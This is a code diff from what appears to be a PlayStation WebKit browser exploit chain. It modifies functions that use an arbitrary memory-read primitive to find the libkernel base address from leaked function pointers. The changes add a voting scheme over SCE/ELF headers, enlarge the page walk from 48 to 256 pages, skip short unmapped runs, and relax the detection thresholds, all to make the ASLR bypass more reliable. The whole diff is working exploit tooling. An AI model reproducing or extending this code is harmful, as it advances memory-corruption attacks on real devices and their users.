@@ -227,21 +227,28 @@ function weakLibkernelBaseHit(p, page, magic, ctx) {
     if (checkPrologueAt(p, page)) return true;
     if (magic === SCE_MAGIC) {
         if (checkPrologueAt(p, page.add32(SCE_ELF_OFF))) return true;
-        if (liteSyscallStubScore(p, page) >= 2) return true;
+        if (liteSyscallStubScore(p, page) >= 1) return true;
     }
-    if (magic === ELF_MAGIC && liteSyscallStubScore(p, page) >= 2) return true;
+    if (magic === ELF_MAGIC && liteSyscallStubScore(p, page) >= 1) return true;
     return isLibkernelPrologue(p, page, ctx);
 }
 
-/** Walk aligned pages below fn ptr — no fnPtr read, break on unmapped. */
+/** Walk aligned pages below fn ptr — no fnPtr read, skip short unmapped runs. */
 function resolveExtPtrPageWalk(p, fnPtr, webkitBase, off, maxPages) {
-    maxPages = maxPages != null ? maxPages : 48;
+    maxPages = maxPages != null ? maxPages : 256;
     const ctx = { fnPtr, webkitBase, off };
     let page = pageAlignDown(fnPtr, 0x4000);
+    let nullStreak = 0;
     for (let i = 0; i < maxPages; i++) {
         if (!page || !plausibleLkBeforeRead(page, fnPtr, webkitBase, off)) break;
         const magic = read4p(p, page);
-        if (magic == null) break;
+        if (magic == null) {
+            nullStreak++;
+            if (nullStreak >= 4) break;
+            page = page.sub32(0x4000);
+            continue;
+        }
+        nullStreak = 0;
         if (weakLibkernelBaseHit(p, page, magic, ctx)) {
             const kOff = Number(ptrBig(fnPtr) - ptrBig(page));
             const tag = magic === SCE_MAGIC ? "walk-sce" : (magic === ELF_MAGIC ? "walk-elf" : "walk-pro");
@@ -254,6 +261,85 @@ function resolveExtPtrPageWalk(p, fnPtr, webkitBase, off, maxPages) {
             };
         }
         page = page.sub32(0x4000);
+    }
+    return null;
+}
+
+/** Vote SCE/ELF headers found below many ext ptrs — picks libkernel base. */
+export function resolveExtListVote(p, extHexList, off, webkitBase, opts) {
+    opts = opts || {};
+    if (!p || !extHexList || !extHexList.length) return null;
+    const maxPages = opts.walkPages != null ? opts.walkPages : 256;
+    const votes = new Map();
+
+    for (let ei = 0; ei < extHexList.length; ei++) {
+        const raw = String(extHexList[ei]).replace(/^0x/i, "").trim();
+        if (!raw) continue;
+        const fnPtr = parseAddrSync(raw);
+        if (!fnPtr || fnPtr.hi < 0x8) continue;
+
+        let page = pageAlignDown(fnPtr, 0x4000);
+        let nullStreak = 0;
+        for (let i = 0; i < maxPages; i++) {
+            if (!page || !plausibleLkBeforeRead(page, fnPtr, webkitBase, off)) break;
+            const magic = read4p(p, page);
+            if (magic == null) {
+                nullStreak++;
+                if (nullStreak >= 4) break;
+                page = page.sub32(0x4000);
+                continue;
+            }
+            nullStreak = 0;
+            if (magic === SCE_MAGIC || magic === ELF_MAGIC) {
+                const key = ptrBig(page).toString(16);
+                let ent = votes.get(key);
+                if (!ent) {
+                    ent = { lk: page, count: 0, magic: magic, refs: [] };
+                    votes.set(key, ent);
+                }
+                ent.count++;
+                if (ent.refs.length < 4)
+                    ent.refs.push(raw.slice(-8));
+            }
+            page = page.sub32(0x4000);
+        }
+    }
+
+    if (!votes.size) return null;
+
+    const ranked = [];
+    votes.forEach(function (ent, key) {
+        ranked.push({ key: key, lk: ent.lk, count: ent.count, magic: ent.magic, refs: ent.refs });
+    });
+    ranked.sort(function (a, b) { return b.count - a.count; });
+
+    opts._voteRank = ranked.slice(0, 4);
+
+    for (let ri = 0; ri < ranked.length; ri++) {
+        const cand = ranked[ri];
+        const ctx = { webkitBase, off };
+        const v = verifyLibkernelBase(p, cand.lk, off, ctx);
+        if (v.ok && v.strong) {
+            return {
+                lk: cand.lk,
+                iatRva: null,
+                via: "vote+" + cand.count + "+stub",
+                k__error: null,
+                vote: cand.count,
+                rank: ri,
+            };
+        }
+        if (v.ok || weakLibkernelBaseHit(p, cand.lk, cand.magic, ctx)) {
+            return {
+                lk: cand.lk,
+                iatRva: null,
+                via: "vote+" + cand.count + (v.ok ? "+weak" : "+sce"),
+                k__error: null,
+                vote: cand.count,
+                rank: ri,
+                weak: !v.strong,
+            };
+        }
     }
     return null;
 }
@@ -301,7 +387,7 @@ function plausibleLkBeforeRead(lk, fnPtr, webkitBase, off) {
         const lkB = ptrBig(lk);
         const fnB = ptrBig(fnPtr);
         if (fnB <= lkB) return false;
-        if (fnB - lkB > 0x600000n) return false;
+        if (fnB - lkB > 0x1400000n) return false;
         if (lk.hi !== fnPtr.hi && Math.abs(lk.hi - fnPtr.hi) > 1) return false;
     }
     if (webkitBase && ptrInWebkitImage(lk, webkitBase, off)) return false;
@@ -2038,7 +2124,7 @@ export function resolveExtPtrSafe(p, fnPtr, off, webkitBase, opts) {
         const kOff = Number(ptrBig(fnPtr) - ptrBig(pageBase));
         return { lk: pageBase, iatRva: null, fnPtr, via: "page+k=" + kOff.toString(16), k__error: kOff };
     }
-    return resolveExtPtrPageWalk(p, fnPtr, webkitBase, off, opts.walkPages);
+    return resolveExtPtrPageWalk(p, fnPtr, webkitBase, off, opts.walkPages != null ? opts.walkPages : 256);
 }
 
 /** Resolve ext code ptr → libkernel base — never reads fnPtr (code page OOM on poops). */
@@ -2087,7 +2173,7 @@ function resolveExtPtrToLibkernel(p, fnPtr, off, webkitBase, iatRva, opts) {
         }
     }
 
-    const walked = resolveExtPtrPageWalk(p, fnPtr, webkitBase, off, opts.walkPages != null ? opts.walkPages : 48);
+    const walked = resolveExtPtrPageWalk(p, fnPtr, webkitBase, off, opts.walkPages != null ? opts.walkPages : 256);
     if (walked) {
         return Object.assign({ iatRva, strong: false }, walked);
     }
